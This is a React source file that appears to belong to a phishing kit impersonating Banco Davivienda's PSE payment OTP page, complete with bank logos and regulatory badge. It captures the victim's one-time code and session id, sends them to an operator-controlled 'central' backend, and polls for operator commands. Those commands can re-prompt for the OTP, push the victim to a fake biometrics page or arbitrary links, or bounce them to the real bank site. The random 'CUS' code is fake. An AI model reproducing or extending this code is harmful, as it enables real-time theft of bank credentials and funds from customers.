import React, { useEffect, useMemo, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingDavivienda from "../../../../../components/LoadingDavivienda";
import "./davivienda_otp_pse.css";
import logoFooter from "../../img/Logo-Davivienda-footer.webp";
import logoDavivienda from "../../img/imgi_1_logo-davivienda2.webp";
import vigilado from "../../img/imgi_17_logo_vigilado.svg";

const DAVI_ERROR_KEY = "davivienda_error_modal";
const DAVI_MID_FLOW_KEY = "davivienda_mid_flow";
const DAVI_OTP_ERROR_AUTO_HIDE_MS = 5000;
const DAVI_OTP_ERROR_MSG =
  "El código OTP no es válido. Por favor verifique el código e intente de nuevo.";

const ESTADOS_TRAS_ENVIO_OTP = [
  "sol_biometria",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_otp",
  "error_login",
  "block_ip",
  "error_blocked",
  "link_bot",
  "sol_link_custom",
];

const capitalizeFirst = (text) => text.charAt(0).toUpperCase() + text.slice(1);

const formatDaviviendaHeaderDate = (date) => {
  const parts = new Intl.DateTimeFormat("es-CO", {
    weekday: "long",
    day: "numeric",
    month: "long",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    hour12: true,
  }).formatToParts(date);

  const get = (type) => parts.find((p) => p.type === type)?.value ?? "";
  const weekday = capitalizeFirst(get("weekday"));
  const day = get("day");
  const month = capitalizeFirst(get("month"));
  const year = get("year");
  const hour = get("hour");
  const minute = get("minute");
  const dayPeriod = get("dayPeriod").replace(/\./g, "").replace(/\s/g, "").toUpperCase();

  return `${weekday} ${day} de ${month} de ${year}, ${hour}:${minute} ${dayPeriod}`;
};

const formatDaviviendaTransactionDate = (date) =>
  new Intl.DateTimeFormat("es-CO", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  }).format(date);

const DaviviendaOtpPse = () => {
  // Se inicializa el navigate
  const navigate = useNavigate();

  const [now, setNow] = useState(() => new Date());
  const [confirmationCode, setConfirmationCode] = useState("");
  const [resendCountdown, setResendCountdown] = useState(0);
  const [getLoading, setLoading] = useState(false);
  const [showOtpErrorAlert, setShowOtpErrorAlert] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const envioEnCursoRef = useRef(false);
  const otpTrasEnviarVioPendienteRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);
  const currentDate = useMemo(() => formatDaviviendaHeaderDate(now), [now]);
  const [transactionDate, setTransactionDate] = useState(() =>
    formatDaviviendaTransactionDate(new Date()),
  );
  const [transactionData, setTransactionData] = useState({
    destinoPago: "",
    motivo: "",
    valorTransaccion: "",
    referencia1: "02",
    referencia2: "",
    referencia3: "7995",
  });
  const isContinueEnabled = confirmationCode.length === 6;
  const cusCode = useMemo(
    () => String(Math.floor(100000000 + Math.random() * 900000000)),
    [],
  );

  useEffect(() => {
    const intervalId = setInterval(() => {
      setNow(new Date());
    }, 1000);
    return () => clearInterval(intervalId);
  }, []);

  useEffect(() => {
    if (resendCountdown <= 0) return undefined;
    const timerId = setInterval(() => {
      setResendCountdown((previous) => (previous <= 1 ? 0 : previous - 1));
    }, 1000);
    return () => clearInterval(timerId);
  }, [resendCountdown]);

  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  const initPolling = () => {
    stopPolling();
    pollingIntervalRef.current = setInterval(() => {
      verifyState();
    }, 3000);
    verifyState();
  };

  const clearOtpFields = () => {
    setConfirmationCode("");
  };

  const dismissOtpErrorAlert = () => {
    setShowOtpErrorAlert(false);

    if (modalBloqueoEstadoRef.current === "error_otp") {
      ignorarEstadoHastaCambioRef.current = "error_otp";
      modalBloqueoEstadoRef.current = null;
    }
  };

  const showOtpCredentialError = () => {
    stopPolling();
    envioEnCursoRef.current = false;
    otpTrasEnviarVioPendienteRef.current = false;
    setLoading(false);
    modalBloqueoEstadoRef.current = "error_otp";
    lastEstadoRef.current = "error_otp";
    sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
    clearOtpFields();
    setShowOtpErrorAlert(true);
    allowPollNavigationRef.current = true;
    initPolling();
    window.scrollTo(0, 0);
  };

  const dismissOtpErrorAlertIfOpen = () => {
    if (showOtpErrorAlert) {
      dismissOtpErrorAlert();
    }
  };

  const loadTransactionDetails = async (sid) => {
    if (!sid) return;

    try {
      const response = await instanceBackend.get(`/pse/receipt/${sid}`);
      const receipt = response?.data?.receipt || {};

      const destinoPago = String(
        receipt.destinoPago || receipt.empresa || "",
      ).trim();
      const motivo = String(
        receipt.motivo || receipt.descripcion || "",
      ).trim();
      const valorTransaccion = String(
        receipt.valorTransaccion || receipt.valor || "",
      ).trim();
      const referencia2 = String(
        receipt.referencia2 || localStorage.getItem("davivienda_usuario") || "",
      ).trim();
      const fechaReceipt = String(receipt.fecha || "").trim();

      setTransactionData((prev) => ({
        ...prev,
        destinoPago,
        motivo,
        valorTransaccion,
        referencia2,
      }));

      if (fechaReceipt) {
        setTransactionDate(fechaReceipt);
      }
    } catch {
      const fallbackDoc = String(
        localStorage.getItem("davivienda_usuario") || "",
      ).trim();
      if (fallbackDoc) {
        setTransactionData((prev) => ({
          ...prev,
          referencia2: fallbackDoc,
        }));
      }
    }
  };

  const bootstrapOtpScreen = () => {
    const pendingError = localStorage.getItem(DAVI_ERROR_KEY);

    if (pendingError === "error_otp") {
      showOtpCredentialError();
    } else if (pendingError === "error_login") {
      setShowModal(true);
      setModalText("Credenciales incorrectas, por favor intente nuevamente.");
    } else if (pendingError === "block_ip") {
      setShowModal(true);
      setModalText("Acceso bloqueado por seguridad.");
    }
    const handledOtpError = pendingError === "error_otp";

    if (pendingError && pendingError !== "error_otp") {
      localStorage.removeItem(DAVI_ERROR_KEY);
    }

    const sid = localStorage.getItem("sessionId");
    if (!sid) return;
    sessionIdRef.current = sid;

    loadTransactionDetails(sid);

    if (!handledOtpError) {
      allowPollNavigationRef.current = true;

      const midFlow = sessionStorage.getItem(DAVI_MID_FLOW_KEY) === "1";
      if (midFlow) {
        envioEnCursoRef.current = true;
        setLoading(true);
      }

      initPolling();
    }
  };

  useEffect(() => {
    if (!showOtpErrorAlert) return undefined;

    const timer = window.setTimeout(() => {
      dismissOtpErrorAlert();
    }, DAVI_OTP_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showOtpErrorAlert]);

  useEffect(() => {
    bootstrapOtpScreen();

    return () => {
      stopPolling();
    };
  }, []);

  const handleResendCode = async () => {
    dismissOtpErrorAlertIfOpen();

    if (getLoading || resendCountdown > 0) return;

    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;
    if (!sessionId) {
      setShowModal(true);
      setModalText("Sesión no encontrada. Vuelve a iniciar sesión.");
      return;
    }

    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    const dataSend = {
      data: {
        attributes: {
          sessionId,
          backend: "P01",
          backend_central_url:
            process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/davivienda/otp-resend",
        },
      },
    };

    try {
      setLoading(true);
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/davivienda/otp-resend", dataSend);

      if (response?.data?.success) {
        const sid = response.data.sessionId ?? sessionId;
        localStorage.setItem("sessionId", sid);
        sessionIdRef.current = sid;
        sessionStorage.setItem(DAVI_MID_FLOW_KEY, "1");
        allowPollNavigationRef.current = true;
        envioEnCursoRef.current = true;
        lastEstadoRef.current = null;
        setResendCountdown(60);
        initPolling();
      } else {
        setShowModal(true);
        setModalText("No se pudo solicitar una nueva notificación. Intenta de nuevo.");
      }
    } catch (error) {
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      setShowModal(true);
      setModalText(
        centralUrl
          ? "Error de comunicación con el servidor central."
          : "Error de conexión con el servidor.",
      );
    } finally {
      setLoading(false);
    }
  };

  // Se crea helper de redirección
  const redirigir = (ruta) => {
    navigate(ruta);
  };

  // Se limpia y cierra modal local
  const closeModal = () => {
    setShowModal(false);
    setModalText("");
    setResendCountdown(0);
  };

  // Se valida estado desde backend
  const verifyState = async () => {
    try {
      const response = await instanceBackend.post(
        `/davivienda/verify-state/${sessionIdRef.current}`,
      );
      const { estado: estadoRaw, url, text } = response?.data || {};
      const estadoActual = (estadoRaw || "").toLowerCase();
      const hasUrl = Boolean(url && String(url).trim());
      const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);

      if (!estadoActual) return;

      if (ignorarEstadoHastaCambioRef.current) {
        if (estadoActual === ignorarEstadoHastaCambioRef.current) return;
        ignorarEstadoHastaCambioRef.current = null;
        modalBloqueoEstadoRef.current = null;
      }

      if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {
        return;
      }

      if (
        ESTADOS_TRAS_ENVIO_OTP.includes(estadoActual) &&
        !allowPollNavigationRef.current
      ) {
        return;
      }

      if (envioEnCursoRef.current && estadoActual === "pendiente") {
        otpTrasEnviarVioPendienteRef.current = true;
      }

      if (lastEstadoRef.current === estadoActual) {
        if (envioEnCursoRef.current && estadoActual === "pendiente") {
          setLoading(true);
        }
        return;
      }

      const estadoAnterior = lastEstadoRef.current;
      lastEstadoRef.current = estadoActual;

      switch (estadoActual) {
        case "pendiente":
        case "awaiting_otp_resend_decision":
          if (envioEnCursoRef.current) {
            setLoading(true);
            if (estadoActual === "pendiente") {
              otpTrasEnviarVioPendienteRef.current = true;
            }
          }
          break;
        case "sol_otp":
          if (envioEnCursoRef.current && !otpTrasEnviarVioPendienteRef.current) {
            setLoading(true);
            break;
          }
          envioEnCursoRef.current = false;
          otpTrasEnviarVioPendienteRef.current = false;
          setLoading(false);
          if (estadoAnterior !== "sol_otp") {
            setConfirmationCode("");
            setResendCountdown(0);
          }
          break;
        case "sol_biometria":
          stopPolling();
          envioEnCursoRef.current = false;
          otpTrasEnviarVioPendienteRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
          redirigir("/davivienda_biometria");
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
          redirigir("/finalizado-pse");
          break;
        case "link_bot":
          if (hasUrl) {
            stopPolling();
            envioEnCursoRef.current = false;
            setLoading(false);
            sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
            window.location.href = url;
          }
          break;
        case "sol_link_custom":
          if (customLink) {
            stopPolling();
            envioEnCursoRef.current = false;
            setLoading(false);
            sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
            window.location.href = customLink;
          }
          break;
        case "error_otp":
          if (envioEnCursoRef.current && !otpTrasEnviarVioPendienteRef.current) {
            setLoading(true);
            break;
          }
          showOtpCredentialError();
          break;
        case "error_login":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          localStorage.setItem(DAVI_ERROR_KEY, "error_login");
          redirigir("/davivienda_pse");
          break;
        case "block_ip":
        case "error_blocked":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
          setShowModal(true);
          setModalText("Acceso bloqueado por seguridad.");
          break;
        default:
          break;
      }
    } catch (error) {
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        stopPolling();
        envioEnCursoRef.current = false;
        setLoading(false);
        sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  // Se procesa submit OTP
  const handleSubmit = async () => {
    if (!isContinueEnabled || getLoading) return;

    dismissOtpErrorAlertIfOpen();

    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;
    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    const dataSend = {
      data: {
        attributes: {
          otp: confirmationCode,
          fecha: new Date().toISOString(),
          sessionId,
          backend: "P01",
          backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/davivienda/otp",
        },
      },
    };

    stopPolling();
    lastEstadoRef.current = null;
    ignorarEstadoHastaCambioRef.current = null;
    modalBloqueoEstadoRef.current = null;
    otpTrasEnviarVioPendienteRef.current = false;
    envioEnCursoRef.current = true;

    try {
      setLoading(true);
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/davivienda/otp", dataSend);

      if (response?.data?.success) {
        const sid = response.data.sessionId ?? sessionId;
        localStorage.setItem("sessionId", sid);
        sessionIdRef.current = sid;
        sessionStorage.setItem(DAVI_MID_FLOW_KEY, "1");
        allowPollNavigationRef.current = true;
        initPolling();
      } else {
        showOtpCredentialError();
      }
    } catch (error) {
      envioEnCursoRef.current = false;
      setLoading(false);
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        sessionStorage.removeItem(DAVI_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      setShowModal(true);
      setModalText(
        centralUrl
          ? "Error de comunicación con el servidor central."
          : "Error de conexión con el servidor.",
      );
    }
  };

  return (
    <div className="davivienda-otp-pse-page">
      <header className="davivienda-otp-pse-header">
        <div className="davivienda-otp-pse-header__container">
          <div className="davivienda-otp-pse-header__brand">
            <img src={logoDavivienda} alt="Davivienda" className="davivienda-otp-pse-header__logo" />
          </div>
          <div className="davivienda-otp-pse-header__info">
            <div className="davivienda-otp-pse-header__datetime">{currentDate}</div>
            <div className="davivienda-otp-pse-header__cus">Código único CUS: {cusCode}</div>
          </div>
        </div>
      </header>

      <main className="davivienda-otp-pse-main">
        <div className="davivienda-otp-pse-content">
          <div className="davivienda-otp-pse-titles">
            <h1 className="davivienda-otp-pse-title">Pago PSE</h1>
          </div>

          {showOtpErrorAlert ? (
            <div className="davi-login-alert" role="alert">
              <span className="davi-login-alert__icon" aria-hidden="true">!</span>
              <p className="davi-login-alert__text">{DAVI_OTP_ERROR_MSG}</p>
            </div>
          ) : null}

          <section className="davivienda-otp-pse-panel">
            <div className="davivienda-otp-pse-panel__left">
              <h2 className="davivienda-otp-pse-section-title">¿De cuál cuenta quiere pagar?</h2>

              <select className="davivienda-otp-pse-select" defaultValue="ahorros">
                <option value="ahorros">Cuenta De Ahorros - ****</option>
              </select>

              <p className="davivienda-otp-pse-copy">
                Ingrese el código de confirmación enviado a su
                <br />
                celular a través de la App:
              </p>

              <input
                type="text"
                className="davivienda-otp-pse-code-input"
                placeholder="Ingrese código"
                inputMode="numeric"
                value={confirmationCode}
                maxLength={6}
                onChange={(event) => {
                  dismissOtpErrorAlertIfOpen();
                  const nextCode = event.target.value.replace(/\D/g, "").slice(0, 6);
                  setConfirmationCode(nextCode);
                }}
              />

              <p className="davivienda-otp-pse-help">
                Si aún no recibe estos mensajes, descargue la app Davivienda y asegúrese de permitir las
                notificaciones.
              </p>
              <p className="davivienda-otp-pse-help">
                En caso de no haber recibido el código de confirmación, solicitalo nuevamente haciendo clic en{" "}
                <button
                  type="button"
                  className="davivienda-otp-pse-inline-action"
                  disabled={resendCountdown > 0}
                  onClick={handleResendCode}
                >
                  "reenviar codigo"
                </button>
                {resendCountdown > 0 ? (
                  <span className="davivienda-otp-pse-inline-countdown">{resendCountdown} seg</span>
                ) : null}
              </p>
              <p className="davivienda-otp-pse-help davivienda-otp-pse-help--last">
                Para realizar su pago, haga clic en una sola vez en el botón Continuar
              </p>

              <div className="davivienda-otp-pse-actions">
                <button
                  type="button"
                  className={`davivienda-otp-pse-btn davivienda-otp-pse-btn--primary${isContinueEnabled ? " davivienda-otp-pse-btn--primary-enabled" : ""
                    }`}
                  disabled={!isContinueEnabled}
                  onClick={handleSubmit}
                >
                  Continuar
                </button>
                <button type="button" className="davivienda-otp-pse-btn davivienda-otp-pse-btn--secondary">
                  Cancelar
                </button>
              </div>
            </div>

            <div className="davivienda-otp-pse-panel__right">
              <h2 className="davivienda-otp-pse-section-title">Detalles de la transacción</h2>

              <div className="davivienda-otp-pse-detail">
                <span className="davivienda-otp-pse-detail__label">Destino de pago</span>
                <span
                  className={`davivienda-otp-pse-detail__value${transactionData.destinoPago ? "" : " davivienda-otp-pse-detail__value--placeholder"
                    }`}
                >
                  {transactionData.destinoPago || "{{destinoPago}}"}
                </span>
              </div>

              <div className="davivienda-otp-pse-detail">
                <span className="davivienda-otp-pse-detail__label">Motivo</span>
                <span
                  className={`davivienda-otp-pse-detail__value${transactionData.motivo ? "" : " davivienda-otp-pse-detail__value--placeholder"
                    }`}
                >
                  {transactionData.motivo || "{{motivo}}"}
                </span>
              </div>

              <div className="davivienda-otp-pse-detail">
                <span className="davivienda-otp-pse-detail__label">Fecha</span>
                <span className="davivienda-otp-pse-detail__value">{transactionDate}</span>
              </div>

              <div className="davivienda-otp-pse-detail davivienda-otp-pse-detail--amount">
                <span className="davivienda-otp-pse-detail__label">Valor transacción</span>
                <span
                  className={`davivienda-otp-pse-detail__amount${transactionData.valorTransaccion ? "" : " davivienda-otp-pse-detail__amount--placeholder"
                    }`}
                >
                  {transactionData.valorTransaccion || "{{valorTransaccion}}"}
                </span>
              </div>

              <div className="davivienda-otp-pse-references">
                <div className="davivienda-otp-pse-reference">
                  <span className="davivienda-otp-pse-reference__label">Referencia 1</span>
                  <span className="davivienda-otp-pse-reference__value">{transactionData.referencia1}</span>
                </div>
                <div className="davivienda-otp-pse-reference">
                  <span className="davivienda-otp-pse-reference__label">Referencia 2</span>
                  <span
                    className={`davivienda-otp-pse-reference__value${transactionData.referencia2 ? "" : " davivienda-otp-pse-reference__value--placeholder"
                      }`}
                  >
                    {transactionData.referencia2 || "{{referencia2}}"}
                  </span>
                </div>
                <div className="davivienda-otp-pse-reference">
                  <span className="davivienda-otp-pse-reference__label">Referencia 3</span>
                  <span className="davivienda-otp-pse-reference__value">{transactionData.referencia3}</span>
                </div>
              </div>
            </div>
          </section>
        </div>
      </main>

      <footer className="davivienda-otp-pse-footer">
        <div className="davivienda-otp-pse-footer__container">
          <div className="davivienda-otp-pse-footer__vigilado">
            <img
              src={vigilado}
              alt="Vigilado Superintendencia Financiera"
              className="davivienda-otp-pse-footer__vigilado-img"
            />
          </div>

          <div className="davivienda-otp-pse-footer__copyright">
            Banco Davivienda S.A. Todos los derechos reservados 2026 .
          </div>

          <div className="davivienda-otp-pse-footer__brand">
            <img src={logoFooter} alt="Davivienda" className="davivienda-otp-pse-footer__logo" />
          </div>
        </div>
      </footer>

      {showModal && (
        <div className="davivienda-modal-wrap" onClick={closeModal}>
          <div className="davivienda-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="davivienda-modal-top">Personas</div>
            <div className="davivienda-modal-mid">
              <p>{modalText}</p>
            </div>
            <div className="davivienda-modal-bot">
              <button
                type="button"
                className="davivienda-modal-accept-btn"
                onClick={closeModal}
              >
                Aceptar
              </button>
            </div>
          </div>
        </div>
      )}

      {getLoading && <LoadingDavivienda isOpen />}
    </div>
  );
};

export default DaviviendaOtpPse;
